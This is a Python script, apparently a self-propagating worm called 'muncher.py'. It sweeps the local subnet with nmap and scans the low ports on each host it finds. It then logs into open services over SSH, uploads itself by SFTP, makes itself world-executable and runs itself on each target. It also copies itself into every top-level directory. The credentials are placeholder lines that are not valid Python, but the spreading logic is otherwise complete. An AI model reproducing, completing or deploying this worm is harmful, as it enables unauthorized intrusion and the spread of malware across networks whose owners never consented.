#!/usr/bin/python3
from sys import argv
import os,subprocess,socket,nmap,paramiko,pysftp

scanner = nmap.PortScanner()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s = paramiko.SSHClient()
s.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def ip_enum():
    user_ip = socket.gethostbyname(socket.gethostname())
    user_ip = user_ip.split('.')
    user_ip = user_ip[0]+'.'+user_ip[1]+'.'+user_ip[2]+'.0/24' #this method will recronstruct the local ip using the current host's ip 
    scanner.scan(hosts=user_ip,arguments='-sn')
    host_list = [(x, scanner[x]['status']['state']) for x in scanner.all_hosts() if x != socket.gethostbyname(socket.gethostname())]
    ip_connection(host_list) #we get all local devices except the current host since they're hypothetically already infected
    
def ip_connection(host_list):
    for i in host_list:
        target = i[0]
        for x in range(0, 1024): #this is from 0 - 1023 which will scan all commonly used ports
            result = scanner.scan(target,str(x))
            result = result['scan'][target]['tcp'][x]['state'] #we check the results of each scan to see if anything is open
            print(f'Port: {x} is {result}')
            if result == 'open':
                open_target = (target, x)
                user = *This will be the target's username
                pw = *this will be the target's password
                try:
                    sock.connect(open_target)
                except Exception as sock_err:
                    print('--->Sock Error!:'+str(sock_err))
                try:
                    s.connect(target,x,username=user,password=pw)
                except Exception as para_err:
                    print('--->Paramiko Error!:'+str(para_err))
                try:
                    local_path = os.path.abspath(__file__)
                    remote_path = '/home/'+user+'/muncher.py'
                    sftp = s.open_sftp()
                    sftp.put(local_path,remote_path) #this takes the current file path and sends it to the target's remote path which is "home"
                    sftp.chmod(remote_path, 0o777) #we change the privileges to allow the code to execute itself
                except Exception as sftp_err:
                    print('--->SFTP ERROR!:'+str(sftp_err))
                sock.close()
                sftp.close()
                stdout = s.exec_command('python ' + remote_path)[1] #this exectutes the remotely saved code to start the process again from the target
                print('File executed: ' +str(__file__))
                s.close()
def copy(script, name):
#this method will copy the worm to any directories in can. Some require higher privileges and will fail, but not interrupt the program
    dir_list = os.listdir('/')
    for x in dir_list:
        subprocess.run(['cp','muncher.py',os.path.abspath('/'+x)])

def main():
    script = argv
    name = str(script[0])
    copy(script, name)
    ip_enum()

if __name__ == '__main__':
    main()
